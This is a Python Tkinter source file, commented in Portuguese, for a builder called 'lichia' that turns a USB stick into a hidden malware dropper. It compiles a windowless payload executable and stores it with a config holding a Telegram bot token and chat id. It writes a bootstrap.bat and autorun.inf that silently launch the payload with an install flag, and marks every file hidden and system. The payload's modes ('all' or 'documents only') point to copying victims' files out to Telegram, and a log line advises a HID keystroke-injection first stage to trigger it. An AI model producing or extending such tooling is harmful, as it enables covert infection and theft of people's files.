# language: Python 3.10+, file: lichia_gui.py, target: Windows 11, Tkinter stdlib
# Lichia — GUI de configuracao. Prepara o pendrive: oculta payload + config.
# Rodar: python lichia_gui.py       (so stdlib)
import ctypes
import json
import os
import shutil
import subprocess
import threading
import urllib.parse
import urllib.request
from pathlib import Path

import tkinter as tk
from tkinter import messagebox, filedialog
from tkinter.scrolledtext import ScrolledText


BG      = "#FFF0F3"
SKIN    = "#E8507E"
SKIN_D  = "#C2185B"
LEAF    = "#8BC34A"
CARD    = "#FFDEE7"
TEXT    = "#3E1F2B"
MUTED   = "#8A6470"
FONT    = ("Segoe UI", 10)
TITLE_F = ("Segoe UI Semibold", 16)
SUB_F   = ("Segoe UI", 9)

FILE_ATTRIBUTE_HIDDEN = 0x02
FILE_ATTRIBUTE_SYSTEM = 0x04
CREATE_NO_WINDOW = 0x08000000


def set_hidden(path):
    ctypes.windll.kernel32.SetFileAttributesW(
        str(path), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)


def removable_drives():
    mask = ctypes.windll.kernel32.GetLogicalDrives()
    out = []
    for i in range(26):
        if mask & (1 << i):
            letter = f"{chr(ord('A') + i)}:"
            if ctypes.windll.kernel32.GetDriveTypeW(letter) == 2:
                try:
                    os.listdir(letter + "\\")
                    out.append(letter + "\\")
                except OSError:
                    continue
    return out


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("lichia — configurador de pendrive")
        self.configure(bg=BG)
        self.geometry("540x700")
        self.resizable(False, False)
        self._build()


    def _build(self):
        head = tk.Frame(self, bg=BG)
        head.pack(fill="x", padx=20, pady=(18, 8))
        tk.Label(head, text="lichia", bg=BG, fg=SKIN,
                 font=("Segoe UI Semibold", 26)).pack(side="left")
        tk.Label(head, text=" paste · copy · go",
                 bg=BG, fg=MUTED, font=SUB_F).pack(side="left",
                                                   padx=(8, 0), pady=(12, 0))
        tk.Frame(head, bg=LEAF, height=3, width=40).pack(side="left",
                 padx=(10, 0), pady=(14, 0))


        card = tk.Frame(self, bg=CARD, bd=0, highlightthickness=0)
        card.pack(fill="x", padx=20, pady=8)
        inner = tk.Frame(card, bg=CARD)
        inner.pack(fill="both", expand=True, padx=16, pady=14)
        inner.columnconfigure(0, weight=1)


        def field(row, label, show=""):
            tk.Label(inner, text=label, bg=CARD, fg=TEXT,
                     font=FONT).grid(row=row, column=0, sticky="w",
                                     pady=(6, 2))
            e = tk.Entry(inner, show=show, bg="#FFFFFF", fg=TEXT,
                         relief="flat", font=FONT,
                         highlightthickness=1,
                         highlightbackground=SKIN,
                         highlightcolor=SKIN_D)
            e.grid(row=row + 1, column=0, sticky="ew", ipady=6, pady=(0, 4))
            return e


        self.e_token = field(0, "token do bot do telegram")
        self.e_chat  = field(2, "chat id")
        self.e_max   = field(4, "tamanho max por arquivo (MB)")
        self.e_max.insert(0, "200")


        tk.Label(inner, text="modo", bg=CARD, fg=TEXT,
                 font=FONT).grid(row=6, column=0, sticky="w", pady=(6, 2))
        self.mode_var = tk.StringVar(self, "Tudo")
        cb = tk.Menubutton(inner, textvariable=self.mode_var,
                           bg=CARD, fg=SKIN_D, relief="flat", font=FONT,
                           cursor="hand2", anchor="w", highlightthickness=1,
                           highlightbackground=SKIN, highlightcolor=SKIN_D)
        menu = tk.Menu(cb, tearoff=0, bg="#FFFFFF", fg=TEXT,
                       activebackground="#FFD1DE", activeforeground=SKIN_D,
                       font=FONT)
        cb.configure(menu=menu)
        for opt in ("Tudo", "Apenas documentos"):
            menu.add_command(label=opt,
                             command=lambda o=opt: self.mode_var.set(o))
        cb.grid(row=7, column=0, sticky="ew", pady=(0, 6), ipady=6)


        btns = tk.Frame(inner, bg=CARD)
        btns.grid(row=8, column=0, sticky="ew", pady=(12, 0))
        btns.columnconfigure(0, weight=1)

        tk.Button(btns, text="●  programar pendrive",
                  command=self.program, bg=SKIN, fg="#FFFFFF",
                  activebackground=SKIN_D, activeforeground="#FFFFFF",
                  relief="flat", font=("Segoe UI Semibold", 11),
                  cursor="hand2").grid(row=0, column=0,
                                       sticky="ew", ipady=8, pady=(0, 6))
        row2 = tk.Frame(btns, bg=CARD)
        row2.grid(row=1, column=0, sticky="ew")
        row2.columnconfigure(0, weight=1)
        row2.columnconfigure(1, weight=1)

        tk.Button(row2, text="gerar payload.exe", command=self.build_payload,
                  bg=CARD, fg=SKIN_D, relief="flat", font=FONT,
                  cursor="hand2").grid(row=0, column=0, sticky="ew",
                                       ipady=6, padx=(0, 4))
        tk.Button(row2, text="testar bot", command=self.test_bot,
                  bg=CARD, fg=SKIN_D, relief="flat", font=FONT,
                  cursor="hand2").grid(row=0, column=1, sticky="ew",
                                       ipady=6, padx=(4, 0))


        logcard = tk.Frame(self, bg="#FFE8EE", bd=0)
        logcard.pack(fill="both", expand=True, padx=20, pady=(8, 16))
        tk.Label(logcard, text="log", bg="#FFE8EE", fg=MUTED,
                 font=SUB_F).pack(anchor="w", padx=12, pady=(10, 2))
        self.log_txt = ScrolledText(logcard, bg="#FFE8EE", fg=TEXT,
                                    relief="flat", font=("Consolas", 9),
                                    bd=0, height=12, state="disabled",
                                    insertbackground=TEXT)
        self.log_txt.pack(fill="both", expand=True, padx=12, pady=(0, 10))





    def log(self, msg):
        self.log_txt.configure(state="normal")
        self.log_txt.insert("end", f"{msg}\n")
        self.log_txt.see("end")
        self.log_txt.configure(state="disabled")


    def cfg_obj(self):
        mode = {"Tudo": "all", "Apenas documentos": "docs"}[
            self.mode_var.get()]
        try:
            max_mb = int(self.e_max.get().strip() or "200")
        except ValueError:
            max_mb = 200
        return {"token": self.e_token.get().strip(),
                "chat_id": self.e_chat.get().strip(),
                "modo": mode, "max_mb": max_mb}


    def pick_drive(self):
        drives = removable_drives()
        if not drives:
            messagebox.showerror("lichia", "nenhum pendrive detectado.")
            return None
        if len(drives) == 1:
            return drives[0]
        win = tk.Toplevel(self)
        win.title("escolher pendrive")
        win.configure(bg=BG)
        win.grab_set()
        chosen = {"d": None}
        tk.Label(win, text="qual pendrive?", bg=BG, fg=TEXT,
                 font=FONT).pack(padx=20, pady=(16, 6))
        for d in drives:
            tk.Button(win, text=d, bg=CARD, fg=SKIN_D,
                      relief="flat", font=FONT, cursor="hand2",
                      command=lambda dd=d: (chosen.__setitem__("d", dd),
                                            win.destroy())
                      ).pack(fill="x", padx=20, pady=3, ipady=6)
        tk.Button(win, text="cancelar", bg=BG, fg=MUTED, relief="flat",
                  font=SUB_F, command=win.destroy).pack(pady=(4, 14))
        win.wait_window()
        return chosen["d"]


    def find_payload_exe(self):
        here = Path(__file__).resolve().parent
        for cand in (here / "payload" / "LichiaPayload.exe",
                     here / "LichiaPayload.exe",
                     here.parent / "payload" / "LichiaPayload.exe"):
            if cand.exists():
                return cand
        return filedialog.askopenfilename(
            title="aponte para o LichiaPayload.exe",
            filetypes=[("exe", "*.exe"), ("todos", "*.*")])


    def program(self):
        cfg = self.cfg_obj()
        if not cfg["token"] or not cfg["chat_id"]:
            messagebox.showwarning("lichia", "preencha token e chat id.")
            return
        drive = self.pick_drive()
        if not drive:
            return
        exe = self.find_payload_exe()
        if not exe or not Path(exe).exists():
            self.log("payload exe nao encontrado — rode 'gerar payload.exe' primeiro.")
            return


        root = Path(drive)
        ldir = root / "Lichia"
        ldir.mkdir(parents=True, exist_ok=True)

        shutil.copy2(exe, ldir / "LichiaPayload.exe")
        (ldir / "lichen.config").write_text(
            json.dumps(cfg, indent=2), encoding="utf-8")
        (root / "bootstrap.bat").write_text(
            '@echo off\r\n'
            'for /f "tokens=*" %%a in (\'wmic logicaldisk where drivetype^=2 '
            'get caption ^| find ":"\') do @if exist "%%a\\Lichia\\'
            'LichiaPayload.exe" start "" /min "%%a\\Lichia\\LichiaPayload.exe"'
            ' --install\r\n',
            encoding="utf-8")
        (root / "autorun.inf").write_text(
            "[Autorun]\r\n"
            "open=bootstrap.bat\r\n"
            "action=Lichia Sync\r\n"
            "icon=lichia.ico\r\n",
            encoding="utf-8")


        set_hidden(ldir)
        for p in ldir.iterdir():
            set_hidden(p)
        set_hidden(root / "bootstrap.bat")
        set_hidden(root / "autorun.inf")

        self.log(f"lichia plantada em {drive}")
        self.log("  \\Lichia\\LichiaPayload.exe   (oculto)")
        self.log("  \\Lichia\\lichen.config       (oculto)")
        self.log("  \\bootstrap.bat  \\autorun.inf (ocultos)")
        self.log("lembre: Win10/11 nao roda autorun sozinho —")
        self.log("use o first stage .duck (HID) para disparo frio.")


    def build_payload(self):
        src = Path(__file__).resolve().parent / "payload" / "LichiaPayload.py"
        if not src.exists():
            self.log(f"payload.py nao encontrado em {src}")
            return
        self.log("compilando com pyinstaller ...")

        def run():
            r = subprocess.run(
                ["pyinstaller", "--onefile", "--noconsole",
                 "--name", "LichiaPayload", str(src)],
                cwd=str(src.parent), capture_output=True, text=True)
            out = src.parent / "dist" / "LichiaPayload.exe"
            if r.returncode == 0 and out.exists():
                self.log("payload.exe pronto em " + str(out))
            else:
                self.log("falha na compilacao — " + (r.stderr or "")[-300:])

        threading.Thread(target=run, daemon=True).start()



    def test_bot(self):
        cfg = self.cfg_obj()
        if not cfg["token"] or not cfg["chat_id"]:
            self.log("token/chat id vazios.")
            return
        try:
            url = f"https://api.telegram.org/bot{cfg['token']}/sendMessage"
            data = urllib.parse.urlencode(
                {"chat_id": cfg["chat_id"], "text": "lichia: teste"}).encode()
            with urllib.request.urlopen(urllib.request.Request(url, data=data),
                                        timeout=15) as r:
                code = r.status
            self.log("bot ok — mensagem enviada." if 200 <= code < 300
                     else f"bot respondeu {code}")
        except Exception as e:
            self.log(f"falha no teste: {e}")



if __name__ == "__main__":
    App().mainloop()
